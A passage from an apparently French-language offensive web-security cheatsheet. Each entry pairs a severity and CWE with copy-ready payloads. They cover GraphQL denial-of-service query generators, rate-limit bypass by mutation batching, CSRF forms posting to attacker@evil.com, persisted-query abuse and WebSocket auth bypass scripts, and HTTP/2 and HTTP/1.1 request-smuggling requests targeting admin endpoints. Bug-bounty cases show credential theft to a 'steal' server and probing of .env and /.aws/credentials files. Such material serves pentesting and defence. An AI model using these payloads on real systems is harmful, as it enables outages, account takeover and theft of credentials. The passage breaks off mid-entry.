{"query":"{ user(id:1) { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } } } } }"}

Script de génération pour profondeur arbitraire :
depth = 15
field = "name"
for _ in range(depth):
    field = f"friends {{ {field} }}"
query = f"{{ user(id:1) {{ {field} }} }}"

Signal de vulnérabilité : temps de réponse croissant de façon non-linéaire avec la profondeur (10 -> 200ms, 15 -> 8s, 20 -> timeout/crash).
```

**Techniques :** nested-query-dos, circular-reference-recursion, query-complexity-exhaustion

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Déni de service par surcharge d'alias (alias overloading) sur un champ coûteux

**🧾 Cheatsheet**
sévérité : high · CWE-770

Complémentaire à la profondeur : si un seul champ est coûteux (ex: un resolver qui fait un appel externe, une recherche full-text, un calcul lourd), répéter ce MÊME champ des milliers de fois sous des alias différents dans UNE requête multiplie le coût serveur par le nombre d'alias, sans jamais dépasser 'une requête HTTP' pour un rate-limiter naïf basé sur le nombre de requêtes/seconde plutôt que sur le coût de résolution.

**Cause racine :** Absence d'analyse de complexité de requête (query cost analysis, ex: librairie graphql-cost-analysis) qui limiterait le coût total pondéré d'une requête plutôt que son nombre brut de requêtes HTTP.

**Preuve technique (verbatim depuis la source) :**

```
Script générant 10 000 alias pour un champ de recherche coûteux :
import json
aliases = "".join(f'a{i}: expensiveSearch(query: "test") {{ id }} ' for i in range(10000))
query = {"query": f"{{ {aliases} }}"}
print(json.dumps(query))

Envoyée en une seule requête POST /graphql, cette query force 10 000 exécutions du resolver `expensiveSearch` -- suffisant pour saturer un pool de connexions DB ou un budget de rate-limiting d'API tierce sous-jacente en un seul appel HTTP.
```

**Techniques :** alias-overloading, expensive-resolver-amplification

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Contourner un rate-limit de création de compte via le batching de mutations

**🧾 Cheatsheet**
sévérité : medium · CWE-799

Si le rate-limiting est appliqué au niveau de la requête HTTP ('5 créations de compte par minute par IP') plutôt qu'au niveau de l'opération GraphQL individuelle, le batching (array de mutations ou alias multiples) permet de créer des dizaines de comptes dans UNE seule requête HTTP -- contournant totalement la limite qui compte des requêtes, pas des mutations exécutées.

**Cause racine :** Le middleware de rate-limiting est branché sur le nombre de requêtes HTTP entrantes, pas sur le nombre d'opérations GraphQL réellement exécutées par le serveur pour chaque requête.

**Preuve technique (verbatim depuis la source) :**

```
Une requête HTTP, 50 mutations de création de compte via alias :
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"mutation { a0: createAccount(email: \"u0@x.com\", password: \"P@ss1!\") { id } a1: createAccount(email: \"u1@x.com\", password: \"P@ss1!\") { id } a2: createAccount(email: \"u2@x.com\", password: \"P@ss1!\") { id } ... a49: createAccount(email: \"u49@x.com\", password: \"P@ss1!\") { id } }"}

Si les 50 comptes sont créés (vérifiable via les 50 IDs retournés), le rate-limit 'par requête' est confirmé contourné -- exploitable pour du credential stuffing, du spam, ou l'abus d'un bonus de bienvenue par compte.
```

**Techniques :** mutation-batching-bypass, rate-limit-per-request-flaw

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### CSRF sur mutation GraphQL exposée en GET avec query en paramètre d'URL

**🧾 Cheatsheet**
sévérité : high · CWE-352

Certains serveurs GraphQL (souvent pour faciliter le cache CDN des queries) acceptent aussi les requêtes GET avec la query encodée en paramètre d'URL, ET n'imposent pas de vérification de Content-Type stricte (`application/json` uniquement) sur les mutations. Combiné à l'absence de token CSRF, cela permet une CSRF classique via une simple balise `<img>` ou un formulaire auto-soumis pointant vers une mutation d'état (changement d'email, ajout d'une clé API, etc.), le navigateur de la victime portant ses cookies de session.

**Cause racine :** Le endpoint GraphQL accepte les mutations via GET (état modifié par une requête sans effet de bord attendu) sans jeton anti-CSRF ni vérification stricte de Content-Type/Origin/Referer.

**Preuve technique (verbatim depuis la source) :**

```
Payload CSRF minimal, une simple image déclenche la mutation avec les cookies de la victime :
<img src="https://api.example.com/graphql?query=mutation{updateEmail(email:%22attacker@evil.com%22){success}}" style="display:none">

Variante formulaire auto-soumis (si POST requis mais Content-Type non vérifié, exploitable en `application/x-www-form-urlencoded` qui ne déclenche pas de preflight CORS) :
<form id=f action="https://api.example.com/graphql" method=POST enctype="text/plain">
  <input name='{"query":"mutation{updateEmail(email:' value='"attacker@evil.com"){success}}"}]' >
</form>
<script>document.getElementById('f').submit()</script>
```

**Techniques :** graphql-get-csrf, content-type-agnostic-endpoint

**Correspond aux classes qualifiantes :** graphql, csrf

**Signal (endpoints/fonctions observés) :**
- `GET /graphql?query=...`

**Paramètres impliqués :** `query`

---

### Abuser des Persisted Queries mal implémentées pour injecter une query arbitraire

**🧾 Cheatsheet**
sévérité : medium · CWE-20

Automatic Persisted Queries (APQ, Apollo) permet au client d'enregistrer une nouvelle query en envoyant SON HASH SHA-256 + le texte complet une première fois ; les appels suivants n'envoient que le hash (le serveur la retrouve en cache). Si le serveur ne restreint pas QUI peut enregistrer une nouvelle query (comportement par défaut), un attaquant peut enregistrer n'importe quelle query/mutation de son choix -- y compris des champs non exposés à l'UI officielle -- en jouant sur l'API APQ elle-même plutôt qu'en cherchant les queries déjà utilisées par le frontend.

**Cause racine :** L'endpoint APQ accepte l'enregistrement de nouvelles paires hash/query sans authentification ni restriction sur le contenu, permettant d'enregistrer et d'exécuter des opérations non prévues pour être exposées publiquement.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- enregistrer une nouvelle query arbitraire avec son hash SHA-256 :
import hashlib, json
query = '{ adminOnlyField { secret } }'
h = hashlib.sha256(query.encode()).hexdigest()
print(json.dumps({"query": query, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": h}}}))

POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{ adminOnlyField { secret } }","extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash calculé>"}}}

Étape 2 -- rejouer ensuite avec juste le hash (prouve l'enregistrement, utile pour contourner un WAF qui bloque certains mots-clés en clair dans le champ query) :
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<même hash>"}}}
```

**Techniques :** persisted-query-registration-abuse, apq-cache-poisoning

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `extensions.persistedQuery.sha256Hash`, `query`

---

### Fuite de stack trace / requête SQL brute via les messages d'erreur GraphQL en debug

**🧾 Cheatsheet**
sévérité : medium · CWE-209

En mode debug (souvent oublié actif en prod, ex: `debug: true` sur Apollo Server, `DEBUG=True` côté Graphene/Django), une erreur non gérée dans un resolver (type mismatch, contrainte DB violée, exception non catchée) renvoie la stack trace COMPLÈTE dans la réponse GraphQL, y compris parfois la requête SQL brute exécutée -- une mine d'or pour cartographier le schéma de base de données réel et confirmer une injection SQL en aveugle.

**Cause racine :** Le serveur GraphQL est déployé avec le mode debug/introspection d'erreurs activé, renvoyant `extensions.exception.stacktrace` dans la réponse au lieu d'un message d'erreur générique.

**Preuve technique (verbatim depuis la source) :**

```
Requête qui force une erreur de type pour déclencher la stack trace (ex: passer une chaîne à un champ ID numérique) :
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{ user(id: \"' OR 1=1--\") { email } }"}

Réponse typique en mode debug :
{"errors":[{"message":"invalid input syntax for type integer","extensions":{"exception":{"stacktrace":["error: invalid input syntax for type integer: \"' OR 1=1--\"","    at Connection.parseE (/app/node_modules/pg/lib/connection.js:...)","    at Query.<anonymous> (/app/node_modules/pg-pool/index.js:...)"],"query":"SELECT * FROM users WHERE id = $1"}}}]}
-- la requête SQL brute exposée confirme la structure de la table et la présence d'un paramètre bindé (donc probablement pas injectable directement ici, mais la fuite de schéma reste exploitable ailleurs).
```

**Techniques :** error-message-information-disclosure, sql-error-leak-via-resolver

**Correspond aux classes qualifiantes :** graphql, sqli

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Contourner une autorisation vérifiée seulement à la racine via un champ imbriqué

**🧾 Cheatsheet**
sévérité : high · CWE-863

Un middleware d'autorisation appliqué uniquement au niveau du CHAMP RACINE de la query (ex: `me { ... }` vérifie bien que l'appelant accède à SON propre profil) peut oublier de revalider l'autorisation sur des champs IMBRIQUÉS qui exposent en réalité d'autres objets (ex: `me { organization { allMembers { salary } } }` -- `allMembers` traverse vers des données d'AUTRES utilisateurs sans que la vérification racine 'c'est bien moi' ne s'applique à ce sous-graphe).

**Cause racine :** L'autorisation est vérifiée uniquement au niveau du resolver racine de la query, pas à chaque niveau de résolution du graphe, permettant de pivoter vers des données non autorisées via un champ imbriqué à partir d'un point d'entrée légitime.

**Preuve technique (verbatim depuis la source) :**

```
Query légitime en apparence (accède à SON PROPRE profil, autorisation racine OK) mais qui pivote vers des données non autorisées via l'imbrication :
POST /graphql HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token utilisateur standard, non-admin, non-manager>

{"query":"{ me { id organization { allMembers { id email salary ssn } } } }"}

Si la réponse contient les salaires/SSN de TOUS les membres de l'organisation (pas seulement ceux visibles au rôle de l'appelant), l'autorisation racine ('c'est bien mon compte') a masqué l'absence de contrôle sur le sous-champ `allMembers`.
```

**Techniques :** field-level-authorization-gap, nested-field-privilege-escalation

**Correspond aux classes qualifiantes :** graphql, privilege-escalation, bola

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Contournement d'authentification sur les Subscriptions GraphQL via WebSocket

**🧾 Cheatsheet**
sévérité : high · CWE-306

L'authentification des Subscriptions GraphQL (canal WebSocket temps réel, ex: notifications live) est souvent implémentée séparément des queries/mutations HTTP classiques -- un développeur peut sécuriser correctement HTTP mais oublier de valider le token d'auth envoyé dans le message `connection_init` du protocole `graphql-ws`, laissant n'importe quel client WebSocket s'abonner à des flux de données censés être privés (ex: `orderUpdates`, `chatMessages` d'un autre utilisateur) sans jamais présenter de token valide.

**Cause racine :** Le handler `onConnect` du serveur WebSocket GraphQL accepte la connexion et les subscriptions sans vérifier/valider le champ `authToken` dans `connectionParams`, ou valide sa PRÉSENCE sans valider sa VALIDITÉ.

**Preuve technique (verbatim depuis la source) :**

```
Script Python (websocket-client) qui se connecte SANS token valide et s'abonne à un flux privé :
import websocket, json
ws = websocket.create_connection("wss://api.example.com/graphql", subprotocols=["graphql-ws"])
ws.send(json.dumps({"type":"connection_init","payload":{"authToken":"invalid-or-empty"}}))
print(ws.recv())  # attendu : connection_ack malgré un token invalide = vulnérable
ws.send(json.dumps({
  "id":"1","type":"start",
  "payload":{"query":"subscription { orderUpdates(userId: \"1234\") { orderId status paymentDetails } }"}
}))
while True:
    print(ws.recv())  # si des données d'un AUTRE utilisateur (userId 1234, pas le nôtre) arrivent, l'auth est bypassée
```

**Techniques :** websocket-subscription-auth-gap, graphql-ws-protocol-abuse

**Correspond aux classes qualifiantes :** graphql, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `WSS /graphql`

**Paramètres impliqués :** `connectionParams.authToken`

---

## HTTP Request Smuggling — Techniques Avancées

*6 cas.*

### Désynchronisation H2.CL via downgrade HTTP/2→HTTP/1.1 et injection CRLF dans un en-tête

**🧾 Cheatsheet**
sévérité : critical · CWE-444

Le protocole HTTP/2 utilise un framing binaire qui interdit en théorie les caractères CR/LF dans les valeurs d'en-têtes, mais certains reverse proxies front-end ne valident pas ces valeurs avant de reconvertir la requête en texte HTTP/1.1 pour le back-end (downgrade H2→H1). En injectant une séquence CRLF dans la valeur d'un en-tête HTTP/2 quelconque, un attaquant fait apparaître, une fois la requête retraduite en texte, une seconde requête complète que le back-end traite comme un appel indépendant sur la même connexion. Combiné à une divergence sur le Content-Length recalculé lors du downgrade (H2.CL), cela permet de smuggler une requête vers des endpoints internes normalement inaccessibles depuis l'extérieur (ex: /admin).

**Cause racine :** Le front-end ne filtre pas les caractères de contrôle CR/LF dans les valeurs d'en-têtes HTTP/2 avant de les sérialiser en texte HTTP/1.1 pour le back-end, ce qui permet l'injection d'une requête entière au sein d'une seule valeur d'en-tête.

**Preuve technique (verbatim depuis la source) :**

```
Requête HTTP/2 envoyée par l'attaquant (représentation en pseudo-headers, un seul en-tête 'foo' porte la charge malveillante) :
:method: POST
:path: /
:authority: vulnerable-website.com
:scheme: https
content-type: application/x-www-form-urlencoded
content-length: 0
foo: bar\r\nGET /admin/deleteUser?user=carlos HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n

Le front-end valide le :path (/) contre sa politique d'accès (qui bloque /admin), autorise la requête, puis la downgrade en texte HTTP/1.1 SANS filtrer le CRLF injecté dans 'foo'. Ce que le back-end reçoit réellement sur la connexion réutilisée :
POST / HTTP/1.1
Host: vulnerable-website.com
content-type: application/x-www-form-urlencoded
content-length: 0
foo: bar
GET /admin/deleteUser?user=carlos HTTP/1.1
Host: vulnerable-website.com


Le back-end interprète cela comme DEUX requêtes pipelinées : la POST / initiale (corps vide), puis la GET /admin/deleteUser?user=carlos qui n'a jamais été vue ni filtrée par le contrôle d'accès du front-end (qui n'a inspecté que le :path original '/'). Résultat : suppression de l'utilisateur carlos via un endpoint censé être protégé.
```

**Techniques :** h2-cl-desync, http2-downgrade, crlf-injection, pseudo-header-abuse

**Correspond aux classes qualifiantes :** http-smuggling, auth-bypass, protocol-vulnerability

---

### Désynchronisation CL.CL via duplication de l'en-tête Content-Length

**🧾 Cheatsheet**
sévérité : high · CWE-444

Certaines paires front-end/back-end reposent toutes les deux sur Content-Length (aucune ne traite Transfer-Encoding), mais lorsqu'une requête contient deux en-têtes Content-Length avec des valeurs différentes, la RFC 7230 impose de rejeter la requête — or de nombreuses implémentations se contentent de retenir la première ou la dernière occurrence sans se coordonner entre elles. Si le front-end retient une valeur et le back-end l'autre, les deux composants découpent le flux TCP à des positions différentes, créant un désync CL.CL exploitable exactement comme un CL.TE classique.

**Cause racine :** Absence de rejet strict des requêtes contenant plusieurs en-têtes Content-Length contradictoires, combinée à un choix divergent (première vs dernière occurrence) entre le front-end et le back-end.

**Preuve technique (verbatim depuis la source) :**

```
Le front-end retient la PREMIÈRE valeur de Content-Length (4) et ne transmet donc que 4 octets de corps pour cette requête avant de considérer la connexion libre pour la suivante ; le back-end, lui, retient la DERNIÈRE valeur (144) et lit donc l'intégralité du bloc comme faisant partie du corps de cette même requête, laissant le reliquat en tampon comme début d'une nouvelle requête pipelinée :

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Content-Length: 144

abc=GET /admin/deleteUser?user=carlos HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1

Le back-end (Content-Length: 144, qui couvre tout le bloc) traite 'abc=GET /admin/deleteUser...' comme un unique corps de formulaire pour la requête POST /, sans jamais exécuter la requête smugglée lui-même. Mais le FRONT-END (Content-Length: 4) considère que le corps de la requête s'arrête après 'abc=' et traite tout le reste ('GET /admin/deleteUser...x=1') comme une SECONDE requête distincte qu'il renvoie séparément vers le pool de connexions back-end partagé — cette seconde requête atterrit alors sur la connexion réutilisée par le PROCHAIN client, contournant les contrôles d'accès normalement appliqués par le front-end sur les requêtes entrantes classiques.
```

**Techniques :** cl-cl-desync, duplicate-header-injection, content-length-obfuscation

**Correspond aux classes qualifiantes :** http-smuggling, auth-bypass

---

### Désynchronisation TE.TE via double en-tête Transfer-Encoding obfusqué

**🧾 Cheatsheet**
sévérité : high · CWE-444

Quand front-end ET back-end supportent tous deux Transfer-Encoding, un smuggling classique (CL.TE/TE.CL) est impossible — sauf si l'un des deux composants peut être trompé pour IGNORER un des deux en-têtes Transfer-Encoding dupliqués via une légère obfuscation (valeur invalide, espace avant les deux-points, tabulation). Le composant qui ignore l'en-tête obfusqué retombe sur Content-Length, tandis que l'autre applique le chunked encoding, recréant artificiellement un désync CL.TE ou TE.CL malgré un support natif de Transfer-Encoding des deux côtés.

**Cause racine :** Deux en-têtes Transfer-Encoding sont présents dans la requête ; le front-end et le back-end ne réagissent pas de la même façon à l'obfuscation de l'un des deux (l'un l'ignore, l'autre l'honore), aboutissant à un traitement de corps différent entre les deux composants.

**Preuve technique (verbatim depuis la source) :**

```
Variante 1 — valeur invalide sur le second en-tête (le front-end, strict, rejette 'xchunked' et retombe sur le premier en-tête valide 'chunked' ; le back-end, laxiste, prend la DERNIÈRE occurrence et ignore silencieusement Transfer-Encoding car 'xchunked' n'est pas reconnu, retombant sur Content-Length: 4) :

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

5c
GET /admin/deleteUser?user=carlos HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


Le front-end (chunked honoré) lit le chunk de taille 0x5c octets contenant la requête smugglée puis le chunk terminal '0', et ne transmet donc QUE le corps chunked complet comme un seul body au back-end. Le back-end (Content-Length: 4 honoré car Transfer-Encoding ignoré) ne lit que les 4 premiers octets '5c\n' + 2 octets comme corps de la POST /, puis traite tout le reste ('GET /admin/deleteUser...x=1\n0\n') comme une requête pipelinée indépendante qui atteint /admin/deleteUser sans repasser par les contrôles d'accès du front-end.

Variante 2 — espace avant les deux-points (invalide selon la RFC, silencieusement ignoré par certains parseurs stricts, mais accepté par d'autres) :
Transfer-Encoding : chunked
Transfer-Encoding: chunked
-> un composant ignore la première ligne (nom d'en-tête invalide 'Transfer-Encoding ' avec espace) et ne voit donc qu'une seule déclaration Transfer-Encoding valide, tandis que l'autre normalise l'espace et voit deux déclarations identiques — la divergence de comportement entre ces deux cas suffit à recréer un TE.CL ou CL.TE exploitable selon la pile testée.
```

**Techniques :** te-te-desync, transfer-encoding-obfuscation, duplicate-header-injection

**Correspond aux classes qualifiantes :** http-smuggling, auth-bypass

---

### Client-side desync (CL.0) : désynchronisation pilotée depuis le navigateur, sans connexion back-end partagée

**🧾 Cheatsheet**
sévérité : high · CWE-444

Contrairement au smuggling classique qui nécessite une connexion back-end mutualisée entre plusieurs clients, la technique « client-side desync » (James Kettle, Black Hat/DEF CON 2022) exploite une désynchronisation CL.0 : le front-end ignore le Content-Length sur les requêtes GET (qui « ne devraient pas » avoir de corps) alors que le back-end en tient compte. Le navigateur de la victime, s'il autorise l'envoi d'un corps sur une requête GET (comportement toléré par certains moteurs), envoie ce corps sur la connexion keep-alive vers le site cible ; le front-end l'ignore et referme la requête, mais le back-end lit ce corps comme le début d'une nouvelle requête pipelinée sur cette MÊME connexion réutilisée par le navigateur pour sa prochaine requête légitime — empoisonnant ainsi sa propre navigation suivante, sans qu'aucune autre victime réelle ne soit nécessaire.

**Cause racine :** Le front-end considère qu'une requête GET n'a jamais de corps et ignore Content-Length pour cette méthode, alors que le back-end respecte cet en-tête quelle que soit la méthode, créant une désynchronisation exploitable uniquement via la connexion keep-alive du navigateur de la cible.

**Preuve technique (verbatim depuis la source) :**

```
Page malveillante hébergée par l'attaquant, exécutée dans le navigateur de la victime :
<script>
fetch('https://vulnerable-website.com/', {
  method: 'GET',
  body: 'GET /404 HTTP/1.1\r\nHost: vulnerable-website.com\r\nFoo: bar\r\n\r\n',
  keepalive: true
});
// le navigateur calcule lui-même un Content-Length correct correspondant à la taille réelle du corps fourni ; cet en-tête n'est donc pas bloqué comme 'forbidden header'
setTimeout(() => location.href = 'https://vulnerable-website.com/my-account', 300);
</script>

Ce que le serveur reçoit réellement sur la connexion TCP réutilisée :
GET / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 61
Connection: keep-alive

GET /404 HTTP/1.1
Host: vulnerable-website.com
Foo: bar


Le front-end (CL.0) sert la GET / normalement et ignore les 61 octets suivants comme corps, mais les laisse dans le tampon de la connexion ; le back-end les interprète comme le DÉBUT d'une nouvelle requête pipelinée. Lorsque le même onglet navigue ensuite vers /my-account via cette même connexion keep-alive, la requête légitime de la victime se concatène derrière le fragment injecté : GET /404 HTTP/1.1
Host: vulnerable-website.com
Foo: barGET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=VICTIM_SESSION


-> c'est la propre réponse de la victime qui est empoisonnée : elle reçoit la réponse 404 générée par le fragment injecté à la place de sa page /my-account, permettant à l'attaquant d'y placer un payload XSS reflété ou une redirection ouverte exécutée dans le contexte authentifié de la victime.
```

**Techniques :** client-side-desync, cl0-desync, browser-powered-attack, connection-reuse-abuse

**Correspond aux classes qualifiantes :** http-smuggling, xss, account-takeover

---

### Response queue poisoning via H2.TE : vol de la réponse d'un autre utilisateur

**🧾 Cheatsheet**
sévérité : critical · CWE-444

Lorsqu'un front-end convertit une requête HTTP/2 en HTTP/1.1 chunked vers le back-end, un attaquant qui parvient à faire passer son propre en-tête 'transfer-encoding' dans la requête HTTP/2 (normalement filtré mais parfois toléré) peut faire interpréter au back-end un corps chunked imbriqué contenant une requête additionnelle complète. Le back-end traite alors deux requêtes pour une seule requête front-end sur une connexion back-end réutilisée entre plusieurs clients (pooling), ce qui décale la file des réponses d'une position : le client suivant qui réutilise cette connexion reçoit la réponse destinée à la requête smugglée, tandis que l'attaquant reçoit — un peu plus tard — la réponse qui était destinée à CE client, exposant potentiellement son cookie de session et ses données personnelles.

**Cause racine :** Le pool de connexions back-end est partagé entre plusieurs clients frontaux ; une requête smugglée via H2.TE décale l'association entre une requête back-end et sa réponse, faisant recevoir à un client la réponse destinée à un autre.

**Preuve technique (verbatim depuis la source) :**

```
Requête HTTP/2 de l'attaquant contenant un en-tête transfer-encoding non filtré par le front-end avant le downgrade :
:method: POST
:path: /
:authority: vulnerable-website.com
:scheme: https
transfer-encoding: chunked
content-length: 4

7b
GET /admin HTTP/1.1
Host: vulnerable-website.com

0


Le front-end ajoute SA PROPRE couche de chunked encoding par-dessus la requête déjà traduite en HTTP/1.1, produisant un flux chunked imbriqué ; le back-end termine le parsing de la première requête (POST /) après le chunk contenant 'GET /admin HTTP/1.1...' + le chunk terminal, puis traite le reliquat comme une SECONDE requête pipelinée -> le back-end produit deux réponses pour une connexion où le front-end n'en attendait qu'une seule.

Exploitation en boucle immédiatement après l'envoi de la requête empoisonnée, pour capter la réponse « en trop » dès qu'un autre visiteur réutilise la même connexion back-end :
GET /ordinary-page HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 200 OK  (réponse attendue, contenu normal de la page)

Requête suivante de l'attaquant sur la même connexion, quelques millisecondes plus tard :
GET /ordinary-page HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 200 OK
   Set-Cookie: session=AUTRE_UTILISATEUR_SESSION_ID
   <html>...page personnalisée d'un autre visiteur, incluant son nom et son historique...</html>

-> cette seconde réponse est en réalité celle destinée à un autre client ayant utilisé la même connexion back-end entre-temps (file décalée d'une position), exposant son cookie de session.
```

**Techniques :** response-queue-poisoning, h2-te-desync, backend-connection-pool-abuse

**Correspond aux classes qualifiantes :** http-smuggling, account-takeover, privilege-escalation

---

### Découpage de requêtes HTTP/2 via injection dans un en-tête sur des passerelles gRPC-Web

**🧾 Cheatsheet**
sévérité : critical · CWE-444

Les passerelles gRPC-Web traduisent des appels HTTP/2 natifs (gRPC) reçus depuis un navigateur vers une représentation exploitable par les microservices internes, souvent en reconstruisant des trames HTTP/1.1 textuelles à partir des en-têtes HTTP/2 reçus. Si la passerelle ne filtre pas strictement les caractères de contrôle (octet nul, CR, LF) dans un nom ou une valeur d'en-tête HTTP/2 avant cette sérialisation, un attaquant peut faire apparaître, une fois retraduit en texte, une requête HTTP/1.1 supplémentaire côté back-end interne — ciblant potentiellement une méthode gRPC interne jamais exposée ni contrôlée par la passerelle publique.

**Cause racine :** La passerelle de traduction HTTP/2 vers HTTP/1.1 (gRPC-Web) ne filtre pas les caractères de contrôle dans les noms/valeurs d'en-têtes HTTP/2 avant de les sérialiser en texte pour l'appel interne au microservice gRPC natif.

**Preuve technique (verbatim depuis la source) :**

```
Requête HTTP/2 envoyée à la passerelle gRPC-Web publique (représentation en pseudo-headers) :
:method: POST
:path: /pkg.PublicService/PublicMethod
:authority: grpc-gateway.internal-app.com
:scheme: https
content-type: application/grpc-web+proto
x-custom-meta: value\r\nPOST /pkg.AdminService/DeleteAllUsers HTTP/1.1\r\nHost: grpc-gateway.internal-app.com\r\ncontent-type: application/grpc\r\ncontent-length: 0\r\n\r\n

La passerelle valide le :path public (/pkg.PublicService/PublicMethod, autorisé pour ce client), puis sérialise l'appel interne vers le microservice gRPC natif en texte HTTP/1.1 SANS filtrer le CRLF injecté dans 'x-custom-meta'. Ce que le microservice interne reçoit réellement :
POST /pkg.PublicService/PublicMethod HTTP/1.1
Host: grpc-gateway.internal-app.com
content-type: application/grpc-web+proto
x-custom-meta: value
POST /pkg.AdminService/DeleteAllUsers HTTP/1.1
Host: grpc-gateway.internal-app.com
content-type: application/grpc
content-length: 0


-> la seconde requête, ciblant pkg.AdminService/DeleteAllUsers, atteint le microservice gRPC interne sans jamais passer par les contrôles d'autorisation appliqués au niveau de la passerelle publique, qui n'a inspecté que le premier appel (:path=/pkg.PublicService/PublicMethod).
```

**Techniques :** http2-request-splitting, grpc-web-gateway-abuse, header-injection, crlf-injection

**Correspond aux classes qualifiantes :** http-smuggling, ssrf, privilege-escalation

---

## Information Disclosure & Credential Leaks

*8 cas.*

### Credential Disclosure via Unvalidated directDownloadUrl (Missing DontAddCredentialsAttribute)

**📄 Cas réel**
[source](https://hackerone.com/reports/3400143)

The Nextcloud Desktop Client automatically attaches the logged-in user's Basic Auth credentials to any URL the server supplies via the WebDAV directDownloadUrl property, without verifying same-origin. A malicious or compromised Nextcloud server can set directDownloadUrl to an attacker-controlled host and have the client leak the victim's plaintext username/password. Demonstrated with a fake Nextcloud server and a separate credential-stealer HTTP server.

**Cause racine :** The client's HTTP layer auto-injects the Authorization header into any outgoing request unless a specific flag is set, and the code path handling server-supplied directDownloadUrl never sets that flag or validates the URL's origin.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable code path 1 (src/libsync/propagatedownload.cpp:727-738) -- server-supplied URL used with NO origin check:
QUrl url = QUrl::fromUserInput(_item->_directDownloadUrl);
_job = new GETFileJob(propagator()->account(), url, &_tmpFile, headers, expectedEtagForResume, _resumeStart, this);
// Missing: req.setAttribute(HttpCredentials::DontAddCredentialsAttribute, true);

Vulnerable code path 2 (src/libsync/creds/httpcredentials.cpp:51-64) -- auto-injects Basic Auth on ANY request lacking that attribute:
QNetworkRequest req(request);
if (!req.attribute(HttpCredentials::DontAddCredentialsAttribute).toBool()) {
    if (_cred && !_cred->password().isEmpty()) {
        QByteArray credHash = QByteArray(_cred->user().toUtf8() + ":" + _cred->password().toUtf8()).toBase64();
        req.setRawHeader("Authorization", "Basic " + credHash);
    }
}

Repro (malicious Nextcloud server + credential stealer, both trivial Python http.server handlers): server responds to PROPFIND on /remote.php/dav/files/test/ with a WebDAV multistatus where document.pdf carries <oc:downloadURL>http://localhost:9911/steal</oc:downloadURL>. Client, when the user opens that file, issues a GET to that attacker URL and auto-attaches its Basic Auth header. Stealer server log:
[GET] Request received: /steal
[SUCCESS] Stolen User Credentials: pyozzi:pyozzi_password
   (Raw: Basic cHlvenppOnB5b3p6aV9wYXNzd29yZA==)
```

**Techniques :** missing-origin-validation, credential-auto-injection, malicious-server-poc, basic-auth-leak

**Correspond aux classes qualifiantes :** account-takeover

**Signal (endpoints/fonctions observés) :**
- `/status.php`
- `/index.php/login/v2`
- `/remote.php/dav/files/test/document.pdf`

**Paramètres impliqués :** `directDownloadUrl`, `directDownloadCookies`, `DontAddCredentialsAttribute`, `user`, `password`

---

### Exposed .env File Leading to Full Email Account Takeover

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/exposed-env-file-leading-to-full-email-account-takeover-196a7b57)

A production app left its .env configuration file publicly reachable at /.env, exposing plaintext SMTP, database, AWS, and Stripe credentials. Real impact was verified by configuring an email client with the leaked SMTP credentials and successfully logging into the admin mailbox, which would allow reading/sending emails as admin, accessing orders/voucher codes, and abusing the exposed AWS/database credentials.

**Cause racine :** The .env secrets file was deployed inside the publicly served web root without server-level access restriction or a secrets-management solution.

**Preuve technique (verbatim depuis la source) :**

```
Discovery (single request, mobile browser):
https://company.com/.env
-> file served directly, plaintext:
MAIL_HOST=mail.company.com
MAIL_USERNAME=admin@company.com
MAIL_PASSWORD=AdminPass2024!
DATABASE_URL=postgresql://user:pass@host/db
AWS_ACCESS_KEY_ID=AKIA...
STRIPE_SECRET_KEY=sk_live_...

Verification: configured a standard email client with the leaked SMTP credentials -> successful login to admin@company.com mailbox.

Other endpoints worth the same 5-second check on any target: /env, /.env.backup, /.git/config, /config.php, /.aws/credentials, /phpinfo.php
Recommended server fix: location ~ /\.(env|git|svn) { deny all; }
```

**Techniques :** dotenv-exposure, credential-harvesting, smtp-credential-verification, sensitive-file-discovery

**Correspond aux classes qualifiantes :** account-takeover

**Signal (endpoints/fonctions observés) :**
- `/.env`
- `/env`
- `/.env.backup`
- `/.git/config`
- `/config.php`
- `/.aws/credentials`

**Paramètres impliqués :** `MAIL_HOST`, `MAIL_USERNAME`, `MAIL_PASSWORD`, `DATABASE_URL`, `AWS_ACCESS_KEY_ID`, `STRIPE_SECRET_KEY`

---

### Hardcoded Authentication Token in Public JS → Admin API Session Takeover

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/hardcoded-authentication-token-in-public-js-admin-api-session-takeover-0d9d0d46)

